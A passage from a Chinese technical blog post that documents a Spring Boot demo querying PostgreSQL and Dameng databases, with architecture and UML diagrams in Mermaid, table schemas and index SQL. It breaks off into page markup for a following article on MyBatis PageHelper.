<h2 data-id="heading-9">架构 4+1 视图</h2>
<h3 data-id="heading-10">1. 逻辑视图 (Logical View)</h3>
<p>描述系统的功能组件和它们之间的关系。</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TB
    subgraph "API Layer"
        UC[UnifiedQueryController&lt;br/&gt;统一查询接口]
        FQC[FederatedQueryController&lt;br/&gt;联邦查询接口]
    end

    subgraph "Service Layer"
        SDS[SameDatabaseJoinService&lt;br/&gt;同库关联查询]
        FQS[FederatedQueryService&lt;br/&gt;跨库联合查询]
    end

    subgraph "Repository Layer"
        UR[UserRepository]
        PR[ProductRepository]
        PgPR[PgProductRepository]
        DmUR[DmUserRepository]
    end

    subgraph "Entity Layer"
        U[User / PgUser / DmUser]
        P[Product / PgProduct / DmProduct]
    end

    subgraph "Data Source Layer"
        PG[(PostgreSQL&lt;br/&gt;t_user + t_product)]
        DM[(Dameng DB&lt;br/&gt;T_USER + T_PRODUCT)]
    end

    UC --&gt; SDS
    UC --&gt; FQS
    FQC --&gt; FQS

    SDS --&gt; UR
    SDS --&gt; PgPR
    SDS --&gt; DmUR
    SDS --&gt; PR

    FQS --&gt; UR
    FQS --&gt; PR

    UR --&gt; PG
    PgPR --&gt; PG
    DmUR --&gt; DM
    PR --&gt; DM

    style PG fill:#6495ED
    style DM fill:#DC143C
</code></pre>
<h3 data-id="heading-11">2. 实现视图 (Implementation View)</h3>
<p>描述系统的代码结构和模块组织。</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph LR
    subgraph Controller [Controller Layer]
        UC[UnifiedQueryController]
        FQC[FederatedQueryController]
    end

    subgraph Service [Service Layer]
        SDS[SameDatabaseJoinService]
        FQS[FederatedQueryService]
    end

    subgraph Repository [Repository Layer]
        UR[UserRepository]
        PR[ProductRepository]
        PgPR[PgProductRepository]
        DmUR[DmUserRepository]
    end

    subgraph Entity [Entity Layer]
        U[User]
        P[Product]
        PgU[PgUser]
        PgP[PgProduct]
        DmU[DmUser]
        DmP[DmProduct]
    end

    UC --&gt; SDS
    FQC --&gt; FQS
    SDS --&gt; UR
    SDS --&gt; PgPR
    SDS --&gt; DmUR
    SDS --&gt; PR
    FQS --&gt; UR
    FQS --&gt; PR

    UR --&gt; U
    UR --&gt; PgU
    PgPR --&gt; PgP
    DmUR --&gt; DmU
    PR --&gt; P
    PR --&gt; DmP
</code></pre>
<h3 data-id="heading-12">3. 进程视图 (Process View)</h3>
<p>描述系统的并发和同步机制。</p>
<pre><code class="hljs language-mermaid" lang="mermaid">sequenceDiagram
    participant Client
    participant Controller
    participant Service
    participant PGRepo as PG Repository
    participant DMRepo as DM Repository
    participant PG as PostgreSQL
    participant DM as Dameng DB

    Client-&gt;&gt;Controller: GET /api/query/pg/affordable-products
    Controller-&gt;&gt;Service: queryPgUserAffordableProducts()

    Service-&gt;&gt;PGRepo: queryable(PgUser.class)
    PGRepo-&gt;&gt;PG: SELECT * FROM t_user
    PG--&gt;&gt;PGRepo: List&lt;PgUser&gt;

    Service-&gt;&gt;PGRepo: queryable(PgProduct.class)
    PGRepo-&gt;&gt;PG: SELECT * FROM t_product
    PG--&gt;&gt;PGRepo: List&lt;PgProduct&gt;

    Service-&gt;&gt;Service: 组合结果
    Service--&gt;&gt;Controller: List&lt;Map&gt;
    Controller--&gt;&gt;Client: JSON Response

    Note over Client,DM: PostgreSQL 同库查询完成

    Client-&gt;&gt;Controller: GET /api/query/dm/purchasing-power
    Controller-&gt;&gt;Service: analyzeDmPurchasingPower()

    Service-&gt;&gt;DMRepo: queryable(DmUser.class)
    DMRepo-&gt;&gt;DM: SELECT * FROM T_USER
    DM--&gt;&gt;DMRepo: List&lt;DmUser&gt;

    Service-&gt;&gt;DMRepo: queryable(DmProduct.class)
    DMRepo-&gt;&gt;DM: SELECT * FROM T_PRODUCT
    DM--&gt;&gt;DMRepo: List&lt;DmProduct&gt;

    Service-&gt;&gt;Service: 组合结果
    Service--&gt;&gt;Controller: List&lt;Map&gt;
    Controller--&gt;&gt;Client: JSON Response

    Note over Client,DM: 达梦同库查询完成

    Client-&gt;&gt;Controller: GET /api/query/cross/compare
    Controller-&gt;&gt;Service: compareDataBetweenDatabases()

    par 并行查询两个数据库
        Service-&gt;&gt;PGRepo: count() + sumBalance()
    and
        Service-&gt;&gt;DMRepo: count() + sumBalance()
    end

    Service-&gt;&gt;Service: 计算差异
    Service--&gt;&gt;Controller: Map
    Controller--&gt;&gt;Client: JSON Response

    Note over Client,DM: 跨库联合查询完成
</code></pre>
<h3 data-id="heading-13">4. 部署视图 (Deployment View)</h3>
<p>描述系统的物理部署架构。</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TB
    subgraph "Client Layer"
        Browser[Web Browser]
        RestClient[REST Client]
    end

    subgraph "Application Server"
        App[Spring Boot App&lt;br/&gt;Port: 8080&lt;br/&gt;JDK 21]
    end

    subgraph "Database Layer"
        subgraph "PostgreSQL Server"
            PGDB[(PostgreSQL :5432&lt;br/&gt;Database: ins_bus&lt;br/&gt;Tables:&lt;br/&gt;- t_user&lt;br/&gt;- t_product)]
        end

        subgraph "Dameng Database Server"
            DMDB[(Dameng DB :5236&lt;br/&gt;Database: ins_bus&lt;br/&gt;Tables:&lt;br/&gt;- T_USER&lt;br/&gt;- T_PRODUCT)]
        end
    end

    Browser --&gt;|HTTP| App
    RestClient --&gt;|HTTP| App
    App --&gt;|JDBC| PGDB
    App --&gt;|JDBC| DMDB

    style PGDB fill:#6495ED,color:#fff
    style DMDB fill:#DC143C,color:#fff
</code></pre>
<h3 data-id="heading-14">5. 用例视图 (Use Case View)</h3>
<p>描述系统的功能需求和使用场景。</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TB
    Actor(User)
    Admin(Admin)

    subgraph "PostgreSQL 同库查询"
        UC1[查询用户可购买产品]
        UC2[查询所有用户产品组合]
        UC3[统计用户购买力]
    end

    subgraph "达梦同库查询"
        UC4[查询产品潜在购买者]
        UC5[分析购买力]
        UC6[统计产品购买者]
    end

    subgraph "跨库联合查询"
        UC7[对比数据库数据]
        UC8[汇总所有数据]
    end

    subgraph "数据管理"
        UC9[创建用户]
        UC10[创建产品]
        UC11[更新数据]
        UC12[删除数据]
    end

    Actor --&gt; UC1
    Actor --&gt; UC2
    Actor --&gt; UC3
    Actor --&gt; UC4
    Actor --&gt; UC5
    Actor --&gt; UC6
    Actor --&gt; UC7
    Actor --&gt; UC8
    Admin --&gt; UC9
    Admin --&gt; UC10
    Admin --&gt; UC11
    Admin --&gt; UC12
</code></pre>
<hr/>
<h2 data-id="heading-15">UML 9 图</h2>
<h3 data-id="heading-16">1. 类图 (Class Diagram)</h3>
<p>描述系统的静态结构和类之间的关系。</p>
<pre><code class="hljs language-mermaid" lang="mermaid">classDiagram
    class UnifiedQueryController {
        -SameDatabaseJoinService sameDatabaseJoinService
        +getPgAffordableProducts() Map
        +getDmPurchasingPower() Map
        +compareDatabases() Map
    }

    class SameDatabaseJoinService {
        -UserRepository pgUserRepository
        -PgProductRepository pgProductRepository
        -DmUserRepository dmUserRepository
        -ProductRepository dmProductRepository
        +queryPgUserAffordableProducts() List
        +analyzeDmPurchasingPower() List
        +compareDataBetweenDatabases() Map
    }

    class UserRepository {
        -EasyEntityQuery easyEntityQuery
        +findAll() List
        +findById(String) User
        +queryUsersWithAffordableProducts() List
    }

    class PgProductRepository {
        -EasyEntityQuery easyEntityQuery
        +findAll() List
        +findById(String) PgProduct
    }

    class DmUserRepository {
        -EasyEntityQuery easyEntityQuery
        +findAll() List
        +findById(String) DmUser
    }

    class ProductRepository {
        -EasyEntityQuery easyEntityQuery
        +findAll() List
        +queryUsersForProduct(String) List
    }

    class User {
        &lt;&lt;entity&gt;&gt;
        -String id
        -String username
        -String email
        -Integer age
        -BigDecimal balance
    }

    class PgUser {
        &lt;&lt;entity&gt;&gt;
        @Table("t_user")
        -String id
        -String username
    }

    class DmUser {
        &lt;&lt;entity&gt;&gt;
        @Table("T_USER")
        -String id
        -String username
    }

    class Product {
        &lt;&lt;entity&gt;&gt;
        @Table("T_PRODUCT")
        -String id
        -String name
        -BigDecimal price
    }

    class PgProduct {
        &lt;&lt;entity&gt;&gt;
        @Table("t_product")
        -String id
        -String name
    }

    class DmProduct {
        &lt;&lt;entity&gt;&gt;
        @Table("T_PRODUCT")
        -String id
        -String name
    }

    UnifiedQueryController --&gt; SameDatabaseJoinService
    SameDatabaseJoinService --&gt; UserRepository
    SameDatabaseJoinService --&gt; PgProductRepository
    SameDatabaseJoinService --&gt; DmUserRepository
    SameDatabaseJoinService --&gt; ProductRepository

    UserRepository --&gt; User : manages
    PgProductRepository --&gt; PgProduct : manages
    DmUserRepository --&gt; DmUser : manages
    ProductRepository --&gt; Product : manages
</code></pre>
<h3 data-id="heading-17">2. 对象图 (Object Diagram)</h3>
<p>描述系统在特定时刻的对象状态。</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TB
    subgraph Controllers [Controllers]
        ctrl["UnifiedQueryController&lt;br/&gt;(instance)"]
    end

    subgraph Service [Service]
        svc["SameDatabaseJoinService&lt;br/&gt;(instance)"]
    end

    subgraph PGEs [PostgreSQL Entities]
        pgUser1["PgUser&lt;br/&gt;id: u001&lt;br/&gt;username: 张三&lt;br/&gt;balance: 5000.00"]
        pgUser2["PgUser&lt;br/&gt;id: u004&lt;br/&gt;username: 赵六&lt;br/&gt;balance: 10000.00"]
        pgProd1["PgProduct&lt;br/&gt;id: p001&lt;br/&gt;name: 智能手机&lt;br/&gt;price: 2999.00"]
        pgProd2["PgProduct&lt;br/&gt;id: p008&lt;br/&gt;name: 机械键盘&lt;br/&gt;price: 799.00"]
    end

    subgraph DMEs [Dameng Entities]
        dmUser1["DmUser&lt;br/&gt;id: u001&lt;br/&gt;username: 张三&lt;br/&gt;balance: 5000.00"]
        dmProd1["DmProduct&lt;br/&gt;id: p001&lt;br/&gt;name: 智能手机&lt;br/&gt;price: 2999.00"]
    end

    ctrl --&gt; svc
    svc --&gt; pgUser1
    svc --&gt; pgUser2
    svc --&gt; pgProd1
    svc --&gt; pgProd2
    svc --&gt; dmUser1
    svc --&gt; dmProd1
</code></pre>
<h3 data-id="heading-18">3. 用例图 (Use Case Diagram)</h3>
<pre><code class="hljs language-mermaid" lang="mermaid">graph LR
    User((用户))
    Admin((管理员))
    System(System)

    subgraph "PostgreSQL 同库"
        PG1[查询用户可购买产品]
        PG2[查询用户产品组合]
        PG3[用户购买力统计]
    end

    subgraph "达梦同库"
        DM1[查询产品购买者]
        DM2[购买力分析]
        DM3[产品购买者统计]
    end

    subgraph "跨库"
        Cross1[数据库数据对比]
        Cross2[所有数据汇总]
    end

    subgraph "管理"
        Mgmt1[数据初始化]
        Mgmt2[健康检查]
    end

    User --&gt; PG1
    User --&gt; PG2
    User --&gt; PG3
    User --&gt; DM1
    User --&gt; DM2
    User --&gt; DM3
    User --&gt; Cross1
    User --&gt; Cross2
    Admin --&gt; Mgmt1
    Admin --&gt; Mgmt2
</code></pre>
<h3 data-id="heading-19">4. 序列图 (Sequence Diagram)</h3>
<p>描述 PostgreSQL 同库查询的时序交互。</p>
<pre><code class="hljs language-mermaid" lang="mermaid">sequenceDiagram
    participant Client
    participant Controller
    participant Service
    participant PgUserRepo
    participant PgProductRepo
    participant PG

    Client-&gt;&gt;Controller: GET /api/query/pg/affordable-products
    Controller-&gt;&gt;Service: queryPgUserAffordableProducts()

    Service-&gt;&gt;PgUserRepo: queryable(PgUser.class).toList()
    PgUserRepo-&gt;&gt;PG: SELECT * FROM t_user
    PG--&gt;&gt;PgUserRepo: List&lt;PgUser&gt;
    PgUserRepo--&gt;&gt;Service: List&lt;PgUser&gt;

    Service-&gt;&gt;PgProductRepo: queryable(PgProduct.class).toList()
    PgProductRepo-&gt;&gt;PG: SELECT * FROM t_product
    PG--&gt;&gt;PgProductRepo: List&lt;PgProduct&gt;
    PgProductRepo--&gt;&gt;Service: List&lt;PgProduct&gt;

    Service-&gt;&gt;Service: Stream组合查询
    Note over Service: where balance &gt;= price
    Service--&gt;&gt;Controller: List&lt;Map&gt;
    Controller--&gt;&gt;Client: JSON Response
</code></pre>
<h3 data-id="heading-20">5. 活动图 (Activity Diagram)</h3>
<p>描述跨库数据对比的业务流程。</p>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart TD
    Start([开始]) --&gt; Receive[接收对比请求]

    Receive --&gt; QueryPG[查询 PostgreSQL]
    Receive --&gt; QueryDM[查询达梦数据库]

    QueryPG --&gt; GetPGUsers[获取用户统计]
    QueryPG --&gt; GetPGProducts[获取产品统计]
    QueryDM --&gt; GetDMUsers[获取用户统计]
    QueryDM --&gt; GetDMProducts[获取产品统计]

    GetPGUsers --&gt; WaitPG[等待 PG 完成]
    GetPGProducts --&gt; WaitPG
    GetDMUsers --&gt; WaitDM[等待 DM 完成]
    GetDMProducts --&gt; WaitDM

    WaitPG --&gt; Combine[组合结果]
    WaitDM --&gt; Combine

    Combine --&gt; Calculate[计算差异]
    Calculate --&gt; Build[构建响应]
    Build --&gt; End([返回响应])
</code></pre>
<h3 data-id="heading-21">6. 协作图 (Communication Diagram)</h3>
<p>描述跨库查询的对象间协作。</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph LR
    Client[Client] --&gt;|1: compare| Controller[Controller]
    Controller --&gt;|2: compare| Service[Service]

    Service --&gt;|3: count| PGRepo[PG UserRepo]
    Service --&gt;|4: count| DMRepo[DM UserRepo]
    Service --&gt;|5: count| PGProdRepo[PG ProductRepo]
    Service --&gt;|6: count| DMProdRepo[DM ProductRepo]

    PGRepo --&gt;|7: result| Service
    DMRepo --&gt;|8: result| Service
    PGProdRepo --&gt;|9: result| Service
    DMProdRepo --&gt;|10: result| Service

    Service --&gt;|11: Map| Controller
    Controller --&gt;|12: JSON| Client
</code></pre>
<h3 data-id="heading-22">7. 状态图 (State Diagram)</h3>
<p>描述数据源切换的状态变化。</p>
<pre><code class="hljs language-mermaid" lang="mermaid">stateDiagram-v2
    [*] --&gt; Primary: 启动默认 PG
    Primary --&gt; Switching: @DataSource(DM)
    Switching --&gt; Dameng: 切换到 DM
    Switching --&gt; PostgreSQL: 切换到 PG

    Dameng --&gt; Querying: 执行查询
    PostgreSQL --&gt; Querying: 执行查询

    Querying --&gt; Primary: 重置为默认
    Querying --&gt; Switching: 继续切换
</code></pre>
<h3 data-id="heading-23">8. 组件图 (Component Diagram)</h3>
<p>描述系统的物理组件和依赖关系。</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TB
    subgraph "Web Layer"
        REST[REST API]
    end

    subgraph "Business Layer"
        SameDb[Same-DB Join Service]
        CrossDb[Cross-DB Join Service]
    end

    subgraph "Data Access Layer"
        PG_UserRepo[PG User Repository]
        PG_ProdRepo[PG Product Repository]
        DM_UserRepo[DM User Repository]
        DM_ProdRepo[DM Product Repository]
    end

    subgraph "ORM Layer"
        EQ_PG[EasyQuery PG]
        EQ_DM[EasyQuery DM]
    end

    subgraph "Database Layer"
        PG[(PostgreSQL)]
        DM[(Dameng)]
    end

    REST --&gt; SameDb
    REST --&gt; CrossDb

    SameDb --&gt; PG_UserRepo
    SameDb --&gt; PG_ProdRepo
    SameDb --&gt; DM_UserRepo
    SameDb --&gt; DM_ProdRepo

    CrossDb --&gt; PG_UserRepo
    CrossDb --&gt; DM_ProdRepo

    PG_UserRepo --&gt; EQ_PG
    PG_ProdRepo --&gt; EQ_PG
    DM_UserRepo --&gt; EQ_DM
    DM_ProdRepo --&gt; EQ_DM

    EQ_PG --&gt; PG
    EQ_DM --&gt; DM
</code></pre>
<h3 data-id="heading-24">9. 部署图 (Deployment Diagram)</h3>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TB
    subgraph "客户端"
        Client[Web Browser/REST Client]
    end

    subgraph "应用服务器 :8080"
        App[Spring Boot Application]
        JVM[JDK 21]
        App -.运行.-&gt; JVM
    end

    subgraph "PostgreSQL 服务器 :5432"
        PGIns[数据库实例]
        PGDB[(ins_bus&lt;br/&gt;t_user&lt;br/&gt;t_product)]
        PGIns -.存储.-&gt; PGDB
    end

    subgraph "达梦数据库服务器 :5236"
        DMIns[数据库实例]
        DMDB[(ins_bus&lt;br/&gt;T_USER&lt;br/&gt;T_PRODUCT)]
        DMIns -.存储.-&gt; DMDB
    end

    Client --&gt;|HTTP| App
    App --&gt;|JDBC| PGIns
    App --&gt;|JDBC| DMIns

    style PGDB fill:#6495ED,color:#fff
    style DMDB fill:#DC143C,color:#fff
</code></pre>
<hr/>
<h2 data-id="heading-25">数据库设计</h2>
<h3 data-id="heading-26">双库双表架构</h3>
<p>本项目采用双库双表架构，每个数据库都包含完整的用户和产品表：</p>























<table><thead><tr><th>数据库</th><th>用户表</th><th>产品表</th><th>表名规范</th></tr></thead><tbody><tr><td><strong>PostgreSQL</strong></td><td><code>t_user</code></td><td><code>t_product</code></td><td>小写+下划线</td></tr><tr><td><strong>达梦数据库</strong></td><td><code>T_USER</code></td><td><code>T_PRODUCT</code></td><td>大写+下划线</td></tr></tbody></table>
<h3 data-id="heading-27">表结构设计</h3>
<h4 data-id="heading-28">PostgreSQL 用户表 (t_user)</h4>





















































<table><thead><tr><th>字段名</th><th>类型</th><th>约束</th><th>说明</th></tr></thead><tbody><tr><td>id</td><td>VARCHAR(50)</td><td>PRIMARY KEY</td><td>用户ID</td></tr><tr><td>username</td><td>VARCHAR(100)</td><td>NOT NULL</td><td>用户名</td></tr><tr><td>email</td><td>VARCHAR(100)</td><td/><td>邮箱</td></tr><tr><td>age</td><td>INTEGER</td><td/><td>年龄</td></tr><tr><td>balance</td><td>DECIMAL(10,2)</td><td/><td>余额</td></tr><tr><td>create_time</td><td>TIMESTAMP</td><td>DEFAULT CURRENT_TIMESTAMP</td><td>创建时间</td></tr><tr><td>update_time</td><td>TIMESTAMP</td><td>DEFAULT CURRENT_TIMESTAMP</td><td>更新时间</td></tr></tbody></table>
<h4 data-id="heading-29">PostgreSQL 产品表 (t_product)</h4>





















































<table><thead><tr><th>字段名</th><th>类型</th><th>约束</th><th>说明</th></tr></thead><tbody><tr><td>id</td><td>VARCHAR(50)</td><td>PRIMARY KEY</td><td>产品ID</td></tr><tr><td>name</td><td>VARCHAR(100)</td><td>NOT NULL</td><td>产品名称</td></tr><tr><td>description</td><td>VARCHAR(500)</td><td/><td>产品描述</td></tr><tr><td>price</td><td>DECIMAL(10,2)</td><td>NOT NULL</td><td>价格</td></tr><tr><td>stock</td><td>INTEGER</td><td>NOT NULL</td><td>库存</td></tr><tr><td>create_time</td><td>TIMESTAMP</td><td>DEFAULT CURRENT_TIMESTAMP</td><td>创建时间</td></tr><tr><td>update_time</td><td>TIMESTAMP</td><td>DEFAULT CURRENT_TIMESTAMP</td><td>更新时间</td></tr></tbody></table>
<h4 data-id="heading-30">达梦用户表 (T_USER)</h4>





















































<table><thead><tr><th>字段名</th><th>类型</th><th>约束</th><th>说明</th></tr></thead><tbody><tr><td>ID</td><td>VARCHAR(50)</td><td>PRIMARY KEY</td><td>用户ID</td></tr><tr><td>USERNAME</td><td>VARCHAR(100)</td><td>NOT NULL</td><td>用户名</td></tr><tr><td>EMAIL</td><td>VARCHAR(100)</td><td/><td>邮箱</td></tr><tr><td>AGE</td><td>INTEGER</td><td/><td>年龄</td></tr><tr><td>BALANCE</td><td>DECIMAL(10,2)</td><td/><td>余额</td></tr><tr><td>CREATE_TIME</td><td>TIMESTAMP</td><td>DEFAULT CURRENT_TIMESTAMP</td><td>创建时间</td></tr><tr><td>UPDATE_TIME</td><td>TIMESTAMP</td><td>DEFAULT CURRENT_TIMESTAMP</td><td>更新时间</td></tr></tbody></table>
<h4 data-id="heading-31">达梦产品表 (T_PRODUCT)</h4>





















































<table><thead><tr><th>字段名</th><th>类型</th><th>约束</th><th>说明</th></tr></thead><tbody><tr><td>ID</td><td>VARCHAR(50)</td><td>PRIMARY KEY</td><td>产品ID</td></tr><tr><td>NAME</td><td>VARCHAR(100)</td><td>NOT NULL</td><td>产品名称</td></tr><tr><td>DESCRIPTION</td><td>VARCHAR(500)</td><td/><td>产品描述</td></tr><tr><td>PRICE</td><td>DECIMAL(10,2)</td><td>NOT NULL</td><td>价格</td></tr><tr><td>STOCK</td><td>INTEGER</td><td>NOT NULL</td><td>库存</td></tr><tr><td>CREATE_TIME</td><td>TIMESTAMP</td><td>DEFAULT CURRENT_TIMESTAMP</td><td>创建时间</td></tr><tr><td>UPDATE_TIME</td><td>TIMESTAMP</td><td>DEFAULT CURRENT_TIMESTAMP</td><td>更新时间</td></tr></tbody></table>
<h3 data-id="heading-32">索引设计</h3>
<h4 data-id="heading-33">PostgreSQL 索引</h4>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 用户表索引</span>
<span class="hljs-keyword">CREATE</span> INDEX idx_pg_username <span class="hljs-keyword">ON</span> t_user(username);
<span class="hljs-keyword">CREATE</span> INDEX idx_pg_email <span class="hljs-keyword">ON</span> t_user(email);
<span class="hljs-keyword">CREATE</span> INDEX idx_pg_age <span class="hljs-keyword">ON</span> t_user(age);
<span class="hljs-keyword">CREATE</span> INDEX idx_pg_balance <span class="hljs-keyword">ON</span> t_user(balance);

<span class="hljs-comment">-- 产品表索引</span>
<span class="hljs-keyword">CREATE</span> INDEX idx_pg_product_name <span class="hljs-keyword">ON</span> t_product(name);
<span class="hljs-keyword">CREATE</span> INDEX idx_pg_product_price <span class="hljs-keyword">ON</span> t_product(price);
<span class="hljs-keyword">CREATE</span> INDEX idx_pg_product_stock <span class="hljs-keyword">ON</span> t_product(stock);
</code></pre>
<h4 data-id="heading-34">达梦索引</h4>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 用户表索引</span>
<span class="hljs-keyword">CREATE</span> INDEX idx_dm_username <span class="hljs-keyword">ON</span> T_USER(USERNAME);
<span class="hljs-keyword">CREATE</span> INDEX idx_dm_email <span class="hljs-keyword">ON</span> T_USER(EMAIL);
<span class="hljs-keyword">CREATE</span> INDEX idx_dm_age <span class="hljs-keyword">ON</span> T_USER(AGE);
<span class="hljs-keyword">CREATE</span> INDEX idx_dm_balance <span class="hljs-keyword">ON</span> T_USER(BALANCE);

<span class="hljs-comment">-- 产品表索引</span>
<span class="hljs-keyword">CREATE</span> INDEX idx_dm_product_name <span class="hljs-keyword">ON</span> T_PRODUCT(NAME);
<span class="hljs-keyword">CREATE</span> INDEX idx_dm_product_price <span class="hljs-keyword">ON</span> T_PRODUCT(PRICE);
<span class="hljs-keyword">CREATE</span> INDEX idx_dm_product_stock <span class="hljs-keyword">ON</span> T_PRODUCT(STOCK);
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[MyBatis 分页插件PageHelper]]></title>    <link>https://juejin.cn/post/7595142651727855635</link>    <guid>https://juejin.cn/post/7595142651727855635</guid>    <pubDate>2026-01-15T08:31:14.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595142651727855635" data-draft-id="7595178023256113171" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="MyBatis 分页插件PageHelper"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2026-01-15T08:31:14.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="小周在成长"/> <meta itemprop="url" content="https://juejin.cn/user/3632442150752573"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            MyBatis 分页插件PageHelper
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3632442150752573/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    小周在成长
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-15T08:31:14.000Z" title="Thu Jan 15 2026 08:31:14 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class 